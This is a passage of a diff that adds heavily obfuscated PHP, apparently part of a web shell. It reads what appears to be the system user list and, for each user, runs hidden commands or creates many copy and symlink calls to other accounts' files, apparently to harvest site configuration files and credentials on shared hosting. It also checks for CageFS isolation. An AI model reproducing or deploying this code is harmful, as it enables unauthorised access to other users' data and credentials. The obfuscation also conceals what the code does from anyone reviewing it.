+                ByqTyy($GLOBALS[äØ][0x2f5] . $lpoyk . $GLOBALS[äØ][0x35c] . $c6Zgf . $GLOBALS[äØ][0x35d]);
+                ByqTyy($GLOBALS[äØ][0x2df] . $lpoyk . $GLOBALS[äØ][0x344] . $c6Zgf . $GLOBALS[äØ][0x345]);
+                ByqTyy($GLOBALS[äØ][0x24b] . $lpoyk . $GLOBALS[äØ][0x323] . $c6Zgf . $GLOBALS[äØ][0x324]);
+                ByqTyy($GLOBALS[äØ][0x302] . $lpoyk . $GLOBALS[äØ][0x325] . $c6Zgf . $GLOBALS[äØ][0x326]);
+                ByqTyy($GLOBALS[äØ][0x32b] . $lpoyk . $GLOBALS[äØ][0x348] . $c6Zgf . $GLOBALS[äØ][0x349]);
+                ByqTyy($GLOBALS[äØ][0x359] . $lpoyk . $GLOBALS[äØ][0x35a] . $c6Zgf . $GLOBALS[äØ][0x35b]);
+                ByqTyy($GLOBALS[äØ][0x356] . $lpoyk . $GLOBALS[äØ][0x357] . $c6Zgf . $GLOBALS[äØ][0x358]);
+                ByqTyy($GLOBALS[äØ][0x240] . $lpoyk . $GLOBALS[äØ][0x35e] . $c6Zgf . $GLOBALS[äØ][0x35f]);
+                ByqTyy($GLOBALS[äØ][0x336] . $lpoyk . $GLOBALS[äØ][0x337] . $c6Zgf . $GLOBALS[äØ][0x338]);
+            }
+        }
+        echo $GLOBALS[äØ][0x360] . getcwd() . $GLOBALS[äØ][0x361];
+    } elseif (preg_match($GLOBALS[äØ][0x362], $QJQfs)) {
+        if (file_get_contents($GLOBALS[äØ][0x363])) {
+            echo $GLOBALS[äØ][0x3a1];
+            @mkdir($GLOBALS[äØ][0x39e], 0755);
+            file_put_contents($GLOBALS[äØ][0x39d], $prgj5);
+            $XSVrw = file_get_contents($GLOBALS[äØ][0x39f]);
+            $XSVrw = explode($GLOBALS[äØ][0x7], $XSVrw);
+            echo $GLOBALS[äØ][0x3a0];
+            foreach ($XSVrw as $QJQfs) {
+                $paogY = explode($GLOBALS[äØ][0x13c], $QJQfs);
+                $lpoyk = $paogY[0x5];
+                $c6Zgf = $paogY[0];
+                ByqTyy($GLOBALS[äØ][0x2ae] . $lpoyk . $GLOBALS[äØ][0x37f] . $c6Zgf . $GLOBALS[äØ][0x380]);
+                ByqTyy($GLOBALS[äØ][0x26f] . $lpoyk . $GLOBALS[äØ][0x399] . $c6Zgf . $GLOBALS[äØ][0x39a]);
+                ByqTyy($GLOBALS[äØ][0x2c5] . $lpoyk . $GLOBALS[äØ][0x390] . $c6Zgf . $GLOBALS[äØ][0x391]);
+                ByqTyy($GLOBALS[äØ][0x254] . $lpoyk . $GLOBALS[äØ][0x376] . $c6Zgf . $GLOBALS[äØ][0x377]);
+                ByqTyy($GLOBALS[äØ][0x364] . $lpoyk . $GLOBALS[äØ][0x365] . $c6Zgf . $GLOBALS[äØ][0x366]);
+                ByqTyy($GLOBALS[äØ][0x269] . $lpoyk . $GLOBALS[äØ][0x370] . $c6Zgf . $GLOBALS[äØ][0x371]);
+                ByqTyy($GLOBALS[äØ][0x37c] . $lpoyk . $GLOBALS[äØ][0x37d] . $c6Zgf . $GLOBALS[äØ][0x37e]);
+                ByqTyy($GLOBALS[äØ][0x381] . $lpoyk . $GLOBALS[äØ][0x388] . $c6Zgf . $GLOBALS[äØ][0x389]);
+                ByqTyy($GLOBALS[äØ][0x2ab] . $lpoyk . $GLOBALS[äØ][0x372] . $c6Zgf . $GLOBALS[äØ][0x373]);
+                ByqTyy($GLOBALS[äØ][0x394] . $lpoyk . $GLOBALS[äØ][0x39b] . $c6Zgf . $GLOBALS[äØ][0x39c]);
+                ByqTyy($GLOBALS[äØ][0x314] . $lpoyk . $GLOBALS[äØ][0x38e] . $c6Zgf . $GLOBALS[äØ][0x38f]);
+                ByqTyy($GLOBALS[äØ][0x2e5] . $lpoyk . $GLOBALS[äØ][0x367] . $c6Zgf . $GLOBALS[äØ][0x368]);
+                ByqTyy($GLOBALS[äØ][0x394] . $lpoyk . $GLOBALS[äØ][0x395] . $c6Zgf . $GLOBALS[äØ][0x396]);
+                ByqTyy($GLOBALS[äØ][0x240] . $lpoyk . $GLOBALS[äØ][0x36c] . $c6Zgf . $GLOBALS[äØ][0x36d]);
+                ByqTyy($GLOBALS[äØ][0x311] . $lpoyk . $GLOBALS[äØ][0x384] . $c6Zgf . $GLOBALS[äØ][0x385]);
+                ByqTyy($GLOBALS[äØ][0x2cb] . $lpoyk . $GLOBALS[äØ][0x378] . $c6Zgf . $GLOBALS[äØ][0x379]);
+                ByqTyy($GLOBALS[äØ][0x245] . $lpoyk . $GLOBALS[äØ][0x37a] . $c6Zgf . $GLOBALS[äØ][0x37b]);
+                ByqTyy($GLOBALS[äØ][0x37c] . $lpoyk . $GLOBALS[äØ][0x386] . $c6Zgf . $GLOBALS[äØ][0x387]);
+                ByqTyy($GLOBALS[äØ][0x245] . $lpoyk . $GLOBALS[äØ][0x36e] . $c6Zgf . $GLOBALS[äØ][0x36f]);
+                ByqTyy($GLOBALS[äØ][0x2b3] . $lpoyk . $GLOBALS[äØ][0x392] . $c6Zgf . $GLOBALS[äØ][0x393]);
+                ByqTyy($GLOBALS[äØ][0x364] . $lpoyk . $GLOBALS[äØ][0x38a] . $c6Zgf . $GLOBALS[äØ][0x38b]);
+                ByqTyy($GLOBALS[äØ][0x275] . $lpoyk . $GLOBALS[äØ][0x397] . $c6Zgf . $GLOBALS[äØ][0x398]);
+                ByqTyy($GLOBALS[äØ][0x369] . $lpoyk . $GLOBALS[äØ][0x36a] . $c6Zgf . $GLOBALS[äØ][0x36b]);
+                ByqTyy($GLOBALS[äØ][0x2cb] . $lpoyk . $GLOBALS[äØ][0x374] . $c6Zgf . $GLOBALS[äØ][0x375]);
+                ByqTyy($GLOBALS[äØ][0x2b6] . $lpoyk . $GLOBALS[äØ][0x38c] . $c6Zgf . $GLOBALS[äØ][0x38d]);
+                ByqTyy($GLOBALS[äØ][0x381] . $lpoyk . $GLOBALS[äØ][0x382] . $c6Zgf . $GLOBALS[äØ][0x383]);
+            }
+        } else {
+            ByqTyy($GLOBALS[äØ][0x3df]);
+            echo $GLOBALS[äØ][0x3db];
+            @mkdir($GLOBALS[äØ][0x3dd], 0755);
+            file_put_contents($GLOBALS[äØ][0x3dc], $prgj5);
+            $XSVrw = file_get_contents($GLOBALS[äØ][0x3da]);
+            $XSVrw = explode($GLOBALS[äØ][0x8], $XSVrw);
+            echo $GLOBALS[äØ][0x3de];
+            foreach ($XSVrw as $QJQfs) {
+                $paogY = explode($GLOBALS[äØ][0x1c6], $QJQfs);
+                $lpoyk = $paogY[0x5];
+                $c6Zgf = $paogY[0];
+                ByqTyy($GLOBALS[äØ][0x2ae] . $lpoyk . $GLOBALS[äØ][0x3c8] . $c6Zgf . $GLOBALS[äØ][0x3c9]);
+                ByqTyy($GLOBALS[äØ][0x2a8] . $lpoyk . $GLOBALS[äØ][0x3c4] . $c6Zgf . $GLOBALS[äØ][0x3c5]);
+                ByqTyy($GLOBALS[äØ][0x28c] . $lpoyk . $GLOBALS[äØ][0x3a4] . $lpoyk . $GLOBALS[äØ][0x3a5]);
+                ByqTyy($GLOBALS[äØ][0x272] . $lpoyk . $GLOBALS[äØ][0x3c2] . $c6Zgf . $GLOBALS[äØ][0x3c3]);
+                ByqTyy($GLOBALS[äØ][0x311] . $lpoyk . $GLOBALS[äØ][0x3d6] . $c6Zgf . $GLOBALS[äØ][0x3d7]);
+                ByqTyy($GLOBALS[äØ][0x302] . $lpoyk . $GLOBALS[äØ][0x3b1] . $c6Zgf . $GLOBALS[äØ][0x3b2]);
+                ByqTyy($GLOBALS[äØ][0x2cb] . $lpoyk . $GLOBALS[äØ][0x3d4] . $c6Zgf . $GLOBALS[äØ][0x3d5]);
+                ByqTyy($GLOBALS[äØ][0x381] . $lpoyk . $GLOBALS[äØ][0x3ab] . $c6Zgf . $GLOBALS[äØ][0x3ac]);
+                ByqTyy($GLOBALS[äØ][0x23d] . $lpoyk . $GLOBALS[äØ][0x3ca] . $c6Zgf . $GLOBALS[äØ][0x3cb]);
+                ByqTyy($GLOBALS[äØ][0x3a8] . $lpoyk . $GLOBALS[äØ][0x3cc] . $c6Zgf . $GLOBALS[äØ][0x3cd]);
+                ByqTyy($GLOBALS[äØ][0x3bb] . $lpoyk . $GLOBALS[äØ][0x3bc] . $c6Zgf . $GLOBALS[äØ][0x3bd]);
+                ByqTyy($GLOBALS[äØ][0x281] . $lpoyk . $GLOBALS[äØ][0x3b9] . $c6Zgf . $GLOBALS[äØ][0x3ba]);
+                ByqTyy($GLOBALS[äØ][0x269] . $lpoyk . $GLOBALS[äØ][0x3be] . $c6Zgf . $GLOBALS[äØ][0x3bf]);
+                ByqTyy($GLOBALS[äØ][0x25a] . $lpoyk . $GLOBALS[äØ][0x3d8] . $c6Zgf . $GLOBALS[äØ][0x3d9]);
+                ByqTyy($GLOBALS[äØ][0x3a8] . $lpoyk . $GLOBALS[äØ][0x3a9] . $c6Zgf . $GLOBALS[äØ][0x3aa]);
+                ByqTyy($GLOBALS[äØ][0x302] . $lpoyk . $GLOBALS[äØ][0x3b7] . $c6Zgf . $GLOBALS[äØ][0x3b8]);
+                ByqTyy($GLOBALS[äØ][0x296] . $lpoyk . $GLOBALS[äØ][0x3b5] . $c6Zgf . $GLOBALS[äØ][0x3b6]);
+                ByqTyy($GLOBALS[äØ][0x266] . $lpoyk . $GLOBALS[äØ][0x3ce] . $c6Zgf . $GLOBALS[äØ][0x3cf]);
+                ByqTyy($GLOBALS[äØ][0x314] . $lpoyk . $GLOBALS[äØ][0x3af] . $c6Zgf . $GLOBALS[äØ][0x3b0]);
+                ByqTyy($GLOBALS[äØ][0x2df] . $lpoyk . $GLOBALS[äØ][0x3a2] . $c6Zgf . $GLOBALS[äØ][0x3a3]);
+                ByqTyy($GLOBALS[äØ][0x34d] . $lpoyk . $GLOBALS[äØ][0x3b3] . $c6Zgf . $GLOBALS[äØ][0x3b4]);
+                ByqTyy($GLOBALS[äØ][0x27c] . $lpoyk . $GLOBALS[äØ][0x3c0] . $c6Zgf . $GLOBALS[äØ][0x3c1]);
+                ByqTyy($GLOBALS[äØ][0x2b3] . $lpoyk . $GLOBALS[äØ][0x3d2] . $c6Zgf . $GLOBALS[äØ][0x3d3]);
+                ByqTyy($GLOBALS[äØ][0x275] . $lpoyk . $GLOBALS[äØ][0x3c6] . $c6Zgf . $GLOBALS[äØ][0x3c7]);
+                ByqTyy($GLOBALS[äØ][0x364] . $lpoyk . $GLOBALS[äØ][0x3d0] . $c6Zgf . $GLOBALS[äØ][0x3d1]);
+                ByqTyy($GLOBALS[äØ][0x2cb] . $lpoyk . $GLOBALS[äØ][0x3a6] . $c6Zgf . $GLOBALS[äØ][0x3a7]);
+                ByqTyy($GLOBALS[äØ][0x2df] . $lpoyk . $GLOBALS[äØ][0x3ad] . $c6Zgf . $GLOBALS[äØ][0x3ae]);
+            }
+        }
+        echo $GLOBALS[äØ][0x3e0] . getcwd() . $GLOBALS[äØ][0x3e1];
+    } else {
+        $JzJSr = "/home{$NeKwm}{$z12px}/.cagefs";
+        if (is_dir($JzJSr) && scandir("/home{$NeKwm}{$z12px}/") && !preg_match($GLOBALS[äØ][0x4e1], $QGuda) && !preg_match($GLOBALS[äØ][0x4e2], $QGuda)) {
+            die($GLOBALS[äØ][0x4e3]);
+        }
+        echo $GLOBALS[äØ][0x4de];
+        @mkdir($GLOBALS[äØ][0x4df], 0755);
+        @chdir($GLOBALS[äØ][0x4e4]);
+        file_put_contents($GLOBALS[äØ][0x4e5], $prgj5);
+        $XSVrw = file_get_contents($GLOBALS[äØ][0x4dd]);
+        $XSVrw = explode($GLOBALS[äØ][0x8], $XSVrw);
+        echo $GLOBALS[äØ][0x4e0];
+        foreach ($XSVrw as $QJQfs) {
+            $paogY = explode($GLOBALS[äØ][0x1c6], $QJQfs);
+            $lpoyk = $paogY[0];
+            @copy($GLOBALS[äØ][0xbc] . $lpoyk . $GLOBALS[äØ][0x438], $lpoyk . $GLOBALS[äØ][0x439]);
+            @copy($GLOBALS[äØ][0x3f4] . $lpoyk . $GLOBALS[äØ][0x4b7], $lpoyk . $GLOBALS[äØ][0x4b8]);
+            @copy($GLOBALS[äØ][0x3a] . $lpoyk . $GLOBALS[äØ][0x453], $lpoyk . $GLOBALS[äØ][0x454]);
+            @copy($GLOBALS[äØ][0x43a] . $lpoyk . $GLOBALS[äØ][0x4d7], $lpoyk . $GLOBALS[äØ][0x4d8]);
+            @copy($GLOBALS[äØ][0x2e] . $lpoyk . $GLOBALS[äØ][0x417], $lpoyk . $GLOBALS[äØ][0x418]);
+            @copy($GLOBALS[äØ][0xd5] . $lpoyk . $GLOBALS[äØ][0x455], $lpoyk . $GLOBALS[äØ][0x456]);
+            @copy($GLOBALS[äØ][0x3f4] . $lpoyk . $GLOBALS[äØ][0x447], $lpoyk . $GLOBALS[äØ][0x448]);
+            @copy($GLOBALS[äØ][0x22] . $lpoyk . $GLOBALS[äØ][0x4ad], $lpoyk . $GLOBALS[äØ][0x4ae]);
+            @copy($GLOBALS[äØ][0xdf] . $lpoyk . $GLOBALS[äØ][0x401], $lpoyk . $GLOBALS[äØ][0x402]);
+            @copy($GLOBALS[äØ][0x58] . $lpoyk . $GLOBALS[äØ][0x419], $lpoyk . $GLOBALS[äØ][0x41a]);
+            @copy($GLOBALS[äØ][0xdf] . $lpoyk . $GLOBALS[äØ][0x479], $lpoyk . $GLOBALS[äØ][0x47a]);
+            @copy($GLOBALS[äØ][0x6f] . $lpoyk . $GLOBALS[äØ][0x40f], $lpoyk . $GLOBALS[äØ][0x410]);
+            @copy($GLOBALS[äØ][0x461] . $lpoyk . $GLOBALS[äØ][0x4c3], $lpoyk . $GLOBALS[äØ][0x4c4]);
+            @copy($GLOBALS[äØ][0xd5] . $lpoyk . $GLOBALS[äØ][0x4d1], $lpoyk . $GLOBALS[äØ][0x4d2]);
+            @copy($GLOBALS[äØ][0xa3] . $lpoyk . $GLOBALS[äØ][0x3fb], $lpoyk . $GLOBALS[äØ][0x3fc]);
+            @copy($GLOBALS[äØ][0xa3] . $lpoyk . $GLOBALS[äØ][0x4b5], $lpoyk . $GLOBALS[äØ][0x4b6]);
+            @copy($GLOBALS[äØ][0x11f] . $lpoyk . $GLOBALS[äØ][0x3ee], $lpoyk . $GLOBALS[äØ][0x3ef]);
+            @copy($GLOBALS[äØ][0x58] . $lpoyk . $GLOBALS[äØ][0x47b], $lpoyk . $GLOBALS[äØ][0x47c]);
+            @copy($GLOBALS[äØ][0x140] . $lpoyk . $GLOBALS[äØ][0x4c1], $lpoyk . $GLOBALS[äØ][0x4c2]);
+            @copy($GLOBALS[äØ][0xb4] . $lpoyk . $GLOBALS[äØ][0x4bf], $lpoyk . $GLOBALS[äØ][0x4c0]);
+            @copy($GLOBALS[äØ][0x9f] . $lpoyk . $GLOBALS[äØ][0x403], $lpoyk . $GLOBALS[äØ][0x404]);
+            @copy($GLOBALS[äØ][0x42] . $lpoyk . $GLOBALS[äØ][0x409], $lpoyk . $GLOBALS[äØ][0x40a]);
+            @copy($GLOBALS[äØ][0x60] . $lpoyk . $GLOBALS[äØ][0x471], $lpoyk . $GLOBALS[äØ][0x472]);
+            @copy($GLOBALS[äØ][0x77] . $lpoyk . $GLOBALS[äØ][0x3ec], $lpoyk . $GLOBALS[äØ][0x3ed]);
+            @copy($GLOBALS[äØ][0x12] . $lpoyk . $GLOBALS[äØ][0x3ff], $lpoyk . $GLOBALS[äØ][0x400]);
+            @copy($GLOBALS[äØ][0x7e] . $lpoyk . $GLOBALS[äØ][0x495], $lpoyk . $GLOBALS[äØ][0x496]);
+            @copy($GLOBALS[äØ][0x98] . $lpoyk . $GLOBALS[äØ][0x489], $lpoyk . $GLOBALS[äØ][0x48a]);
+            @copy($GLOBALS[äØ][0x2e] . $lpoyk . $GLOBALS[äØ][0x45f], $lpoyk . $GLOBALS[äØ][0x460]);
+            @copy($GLOBALS[äØ][0x64] . $lpoyk . $GLOBALS[äØ][0x41f], $lpoyk . $GLOBALS[äØ][0x420]);
+            @copy($GLOBALS[äØ][0x58] . $lpoyk . $GLOBALS[äØ][0x443], $lpoyk . $GLOBALS[äØ][0x444]);
+            @copy($GLOBALS[äØ][0x42] . $lpoyk . $GLOBALS[äØ][0x3e2], $lpoyk . $GLOBALS[äØ][0x3e3]);
+            @copy($GLOBALS[äØ][0xd5] . $lpoyk . $GLOBALS[äØ][0x413], $lpoyk . $GLOBALS[äØ][0x414]);
+            @copy($GLOBALS[äØ][0x60] . $lpoyk . $GLOBALS[äØ][0x42a], $lpoyk . $GLOBALS[äØ][0x42b]);
+            @copy($GLOBALS[äØ][0x16d] . $lpoyk . $GLOBALS[äØ][0x436], $lpoyk . $GLOBALS[äØ][0x437]);
+            @copy($GLOBALS[äØ][0x5c] . $lpoyk . $GLOBALS[äØ][0x4d9], $lpoyk . $GLOBALS[äØ][0x4da]);
+            @copy($GLOBALS[äØ][0x60] . $lpoyk . $GLOBALS[äØ][0x4cf], $lpoyk . $GLOBALS[äØ][0x4d0]);
+            @copy($GLOBALS[äØ][0x2e] . $lpoyk . $GLOBALS[äØ][0x3e4], $lpoyk . $GLOBALS[äØ][0x3e5]);
+            @copy($GLOBALS[äØ][0xd1] . $lpoyk . $GLOBALS[äØ][0x4bb], $lpoyk . $GLOBALS[äØ][0x4bc]);
+            @copy($GLOBALS[äØ][0x186] . $lpoyk . $GLOBALS[äØ][0x3f7], $lpoyk . $GLOBALS[äØ][0x3f8]);
+            @copy($GLOBALS[äØ][0x36] . $lpoyk . $GLOBALS[äØ][0x428], $lpoyk . $GLOBALS[äØ][0x429]);
+            @copy($GLOBALS[äØ][0x36] . $lpoyk . $GLOBALS[äØ][0x468], $lpoyk . $GLOBALS[äØ][0x469]);
+            @copy($GLOBALS[äØ][0x60] . $lpoyk . $GLOBALS[äØ][0x477], $lpoyk . $GLOBALS[äØ][0x478]);
+            @copy($GLOBALS[äØ][0x94] . $lpoyk . $GLOBALS[äØ][0x4af], $lpoyk . $GLOBALS[äØ][0x4b0]);
+            @copy($GLOBALS[äØ][0x140] . $lpoyk . $GLOBALS[äØ][0x481], $lpoyk . $GLOBALS[äØ][0x482]);
+            @copy($GLOBALS[äØ][0x1a] . $lpoyk . $GLOBALS[äØ][0x4db], $lpoyk . $GLOBALS[äØ][0x4dc]);
+            @copy($GLOBALS[äØ][0xe] . $lpoyk . $GLOBALS[äØ][0x40d], $lpoyk . $GLOBALS[äØ][0x40e]);
+            @copy($GLOBALS[äØ][0x2e] . $lpoyk . $GLOBALS[äØ][0x3ea], $lpoyk . $GLOBALS[äØ][0x3eb]);
+            @copy($GLOBALS[äØ][0x32] . $lpoyk . $GLOBALS[äØ][0x4d5], $lpoyk . $GLOBALS[äØ][0x4d6]);
+            @copy($GLOBALS[äØ][0xb8] . $lpoyk . $GLOBALS[äØ][0x405], $lpoyk . $GLOBALS[äØ][0x406]);
+            @copy($GLOBALS[äØ][0x32] . $lpoyk . $GLOBALS[äØ][0x487], $lpoyk . $GLOBALS[äØ][0x488]);
+            @copy($GLOBALS[äØ][0xad] . $lpoyk . $GLOBALS[äØ][0x4c9], $lpoyk . $GLOBALS[äØ][0x4ca]);
+            @copy($GLOBALS[äØ][0x82] . $lpoyk . $GLOBALS[äØ][0x4cd], $lpoyk . $GLOBALS[äØ][0x4ce]);
+            @copy($GLOBALS[äØ][0xad] . $lpoyk . $GLOBALS[äØ][0x4b1], $lpoyk . $GLOBALS[äØ][0x4b2]);
+            @copy($GLOBALS[äØ][0x98] . $lpoyk . $GLOBALS[äØ][0x4b3], $lpoyk . $GLOBALS[äØ][0x4b4]);
+            @copy($GLOBALS[äØ][0x43a] . $lpoyk . $GLOBALS[äØ][0x499], $lpoyk . $GLOBALS[äØ][0x49a]);
+            @copy($GLOBALS[äØ][0x68] . $lpoyk . $GLOBALS[äØ][0x48d], $lpoyk . $GLOBALS[äØ][0x48e]);
+            @copy($GLOBALS[äØ][0x3e] . $lpoyk . $GLOBALS[äØ][0x430], $lpoyk . $GLOBALS[äØ][0x431]);
+            @copy($GLOBALS[äØ][0x100] . $lpoyk . $GLOBALS[äØ][0x427], $lpoyk . $GLOBALS[äØ][0x188]);
+            @copy($GLOBALS[äØ][0x1a7] . $lpoyk . $GLOBALS[äØ][0x42e], $lpoyk . $GLOBALS[äØ][0x42f]);
+            @copy($GLOBALS[äØ][0xad] . $lpoyk . $GLOBALS[äØ][0x421], $lpoyk . $GLOBALS[äØ][0x422]);
+            @copy($GLOBALS[äØ][0x73] . $lpoyk . $GLOBALS[äØ][0x491], $lpoyk . $GLOBALS[äØ][0x492]);
+            @copy($GLOBALS[äØ][0x46a] . $lpoyk . $GLOBALS[äØ][0x46b], $lpoyk . $GLOBALS[äØ][0x46c]);
+            @symlink($GLOBALS[äØ][0x2e] . $lpoyk . $GLOBALS[äØ][0x423], $lpoyk . $GLOBALS[äØ][0x424]);
+            @symlink($GLOBALS[äØ][0xb4] . $lpoyk . $GLOBALS[äØ][0x3f9], $lpoyk . $GLOBALS[äØ][0x3fa]);
+            @symlink($GLOBALS[äØ][0x36] . $lpoyk . $GLOBALS[äØ][0x4ab], $lpoyk . $GLOBALS[äØ][0x4ac]);
+            @symlink($GLOBALS[äØ][0x60] . $lpoyk . $GLOBALS[äØ][0x459], $lpoyk . $GLOBALS[äØ][0x45a]);
+            @symlink($GLOBALS[äØ][0x58] . $lpoyk . $GLOBALS[äØ][0x493], $lpoyk . $GLOBALS[äØ][0x494]);
+            @symlink($GLOBALS[äØ][0x12] . $lpoyk . $GLOBALS[äØ][0x407], $lpoyk . $GLOBALS[äØ][0x408]);
+            @symlink($GLOBALS[äØ][0x45] . $lpoyk . $GLOBALS[äØ][0x44d], $lpoyk . $GLOBALS[äØ][0x44e]);
+            @symlink($GLOBALS[äØ][0x49] . $lpoyk . $GLOBALS[äØ][0x44b], $lpoyk . $GLOBALS[äØ][0x44c]);
+            @symlink($GLOBALS[äØ][0x8d] . $lpoyk . $GLOBALS[äØ][0x445], $lpoyk . $GLOBALS[äØ][0x446]);
+            @symlink($GLOBALS[äØ][0x11f] . $lpoyk . $GLOBALS[äØ][0x4c5], $lpoyk . $GLOBALS[äØ][0x4c6]);
+            @symlink($GLOBALS[äØ][0x54] . $lpoyk . $GLOBALS[äØ][0x48b], $lpoyk . $GLOBALS[äØ][0x48c]);
+            @symlink($GLOBALS[äØ][0x3e] . $lpoyk . $GLOBALS[äØ][0x4a3], $lpoyk . $GLOBALS[äØ][0x4a4]);
+            @symlink($GLOBALS[äØ][0x1a] . $lpoyk . $GLOBALS[äØ][0x44f], $lpoyk . $GLOBALS[äØ][0x450]);
+            @symlink($GLOBALS[äØ][0xb8] . $lpoyk . $GLOBALS[äØ][0x4a9], $lpoyk . $GLOBALS[äØ][0x4aa]);
+            @symlink($GLOBALS[äØ][0x112] . $lpoyk . $GLOBALS[äØ][0x46f], $lpoyk . $GLOBALS[äØ][0x470]);
+            @symlink($GLOBALS[äØ][0x73] . $lpoyk . $GLOBALS[äØ][0x45d], $lpoyk . $GLOBALS[äØ][0x45e]);
+            @symlink($GLOBALS[äØ][0x15b] . $lpoyk . $GLOBALS[äØ][0x49f], $lpoyk . $GLOBALS[äØ][0x4a0]);
+            @symlink($GLOBALS[äØ][0xd1] . $lpoyk . $GLOBALS[äØ][0x4d3], $lpoyk . $GLOBALS[äØ][0x4d4]);
+            @symlink($GLOBALS[äØ][0x94] . $lpoyk . $GLOBALS[äØ][0x457], $lpoyk . $GLOBALS[äØ][0x458]);
+            @symlink($GLOBALS[äØ][0xa3] . $lpoyk . $GLOBALS[äØ][0x3e6], $lpoyk . $GLOBALS[äØ][0x3e7]);
+            @symlink($GLOBALS[äØ][0x16] . $lpoyk . $GLOBALS[äØ][0x449], $lpoyk . $GLOBALS[äØ][0x44a]);
+            @symlink($GLOBALS[äØ][0xad] . $lpoyk . $GLOBALS[äØ][0x451], $lpoyk . $GLOBALS[äØ][0x452]);
+            @symlink($GLOBALS[äØ][0x2a] . $lpoyk . $GLOBALS[äØ][0x411], $lpoyk . $GLOBALS[äØ][0x412]);
+            @symlink($GLOBALS[äØ][0xc9] . $lpoyk . $GLOBALS[äØ][0x466], $lpoyk . $GLOBALS[äØ][0x467]);
+            @symlink($GLOBALS[äØ][0x9f] . $lpoyk . $GLOBALS[äØ][0x4a5], $lpoyk . $GLOBALS[äØ][0x4a6]);
+            @symlink($GLOBALS[äØ][0x112] . $lpoyk . $GLOBALS[äØ][0x4a7], $lpoyk . $GLOBALS[äØ][0x4a8]);
+            @symlink($GLOBALS[äØ][0x58] . $lpoyk . $GLOBALS[äØ][0x43d], $lpoyk . $GLOBALS[äØ][0x43e]);
+            @symlink($GLOBALS[äØ][0x16] . $lpoyk . $GLOBALS[äØ][0x425], $lpoyk . $GLOBALS[äØ][0x426]);
+            @symlink($GLOBALS[äØ][0xe6] . $lpoyk . $GLOBALS[äØ][0x3f0], $lpoyk . $GLOBALS[äØ][0x3f1]);
+            @symlink($GLOBALS[äØ][0x3f4] . $lpoyk . $GLOBALS[äØ][0x3f5], $lpoyk . $GLOBALS[äØ][0x3f6]);
+            @symlink($GLOBALS[äØ][0x5c] . $lpoyk . $GLOBALS[äØ][0x40b], $lpoyk . $GLOBALS[äØ][0x40c]);
+            @symlink($GLOBALS[äØ][0x94] . $lpoyk . $GLOBALS[äØ][0x475], $lpoyk . $GLOBALS[äØ][0x476]);
+            @symlink($GLOBALS[äØ][0x12] . $lpoyk . $GLOBALS[äØ][0x3f2], $lpoyk . $GLOBALS[äØ][0x3f3]);
+            @symlink($GLOBALS[äØ][0x2e] . $lpoyk . $GLOBALS[äØ][0x43f], $lpoyk . $GLOBALS[äØ][0x440]);
+            @symlink($GLOBALS[äØ][0x118] . $lpoyk . $GLOBALS[äØ][0x4cb], $lpoyk . $GLOBALS[äØ][0x4cc]);
+            @symlink($GLOBALS[äØ][0x112] . $lpoyk . $GLOBALS[äØ][0x4a1], $lpoyk . $GLOBALS[äØ][0x4a2]);
+            @symlink($GLOBALS[äØ][0xbc] . $lpoyk . $GLOBALS[äØ][0x464], $lpoyk . $GLOBALS[äØ][0x465]);
+            @symlink($GLOBALS[äØ][0x49] . $lpoyk . $GLOBALS[äØ][0x4b9], $lpoyk . $GLOBALS[äØ][0x4ba]);
+            @symlink($GLOBALS[äØ][0x16d] . $lpoyk . $GLOBALS[äØ][0x415], $lpoyk . $GLOBALS[äØ][0x416]);
+            @symlink($GLOBALS[äØ][0x3e] . $lpoyk . $GLOBALS[äØ][0x49b], $lpoyk . $GLOBALS[äØ][0x49c]);
+            @symlink($GLOBALS[äØ][0x82] . $lpoyk . $GLOBALS[äØ][0x47d], $lpoyk . $GLOBALS[äØ][0x47e]);
+            @symlink($GLOBALS[äØ][0x461] . $lpoyk . $GLOBALS[äØ][0x462], $lpoyk . $GLOBALS[äØ][0x463]);
+            @symlink($GLOBALS[äØ][0x112] . $lpoyk . $GLOBALS[äØ][0x441], $lpoyk . $GLOBALS[äØ][0x442]);
+            @symlink($GLOBALS[äØ][0x50] . $lpoyk . $GLOBALS[äØ][0x3e8], $lpoyk . $GLOBALS[äØ][0x3e9]);
+            @symlink($GLOBALS[äØ][0xc9] . $lpoyk . $GLOBALS[äØ][0x432], $lpoyk . $GLOBALS[äØ][0x433]);
+            @symlink($GLOBALS[äØ][0xbc] . $lpoyk . $GLOBALS[äØ][0x4bd], $lpoyk . $GLOBALS[äØ][0x4be]);
+            @symlink($GLOBALS[äØ][0x43a] . $lpoyk . $GLOBALS[äØ][0x43b], $lpoyk . $GLOBALS[äØ][0x43c]);
+            @symlink($GLOBALS[äØ][0x54] . $lpoyk . $GLOBALS[äØ][0x497], $lpoyk . $GLOBALS[äØ][0x498]);
+            @symlink($GLOBALS[äØ][0x50] . $lpoyk . $GLOBALS[äØ][0x4c7], $lpoyk . $GLOBALS[äØ][0x4c8]);
+            @symlink($GLOBALS[äØ][0xa3] . $lpoyk . $GLOBALS[äØ][0x45b], $lpoyk . $GLOBALS[äØ][0x45c]);
+            @symlink($GLOBALS[äØ][0x6f] . $lpoyk . $GLOBALS[äØ][0x42c], $lpoyk . $GLOBALS[äØ][0x42d]);
+            @symlink($GLOBALS[äØ][0x2e] . $lpoyk . $GLOBALS[äØ][0x47f], $lpoyk . $GLOBALS[äØ][0x480]);
+            @symlink($GLOBALS[äØ][0x186] . $lpoyk . $GLOBALS[äØ][0x46d], $lpoyk . $GLOBALS[äØ][0x46e]);
+            @symlink($GLOBALS[äØ][0x7e] . $lpoyk . $GLOBALS[äØ][0x485], $lpoyk . $GLOBALS[äØ][0x486]);
+            @symlink($GLOBALS[äØ][0xe6] . $lpoyk . $GLOBALS[äØ][0x41d], $lpoyk . $GLOBALS[äØ][0x41e]);
+            @symlink($GLOBALS[äØ][0x68] . $lpoyk . $GLOBALS[äØ][0x483], $lpoyk . $GLOBALS[äØ][0x484]);
+            @symlink($GLOBALS[äØ][0x5c] . $lpoyk . $GLOBALS[äØ][0x434], $lpoyk . $GLOBALS[äØ][0x435]);
+            @symlink($GLOBALS[äØ][0x22] . $lpoyk . $GLOBALS[äØ][0x473], $lpoyk . $GLOBALS[äØ][0x474]);
+            @symlink($GLOBALS[äØ][0x6f] . $lpoyk . $GLOBALS[äØ][0x48f], $lpoyk . $GLOBALS[äØ][0x490]);
+            @symlink($GLOBALS[äØ][0x151] . $lpoyk . $GLOBALS[äØ][0x49d], $lpoyk . $GLOBALS[äØ][0x49e]);
+            @symlink($GLOBALS[äØ][0x94] . $lpoyk . $GLOBALS[äØ][0x3fd], $lpoyk . $GLOBALS[äØ][0x3fe]);
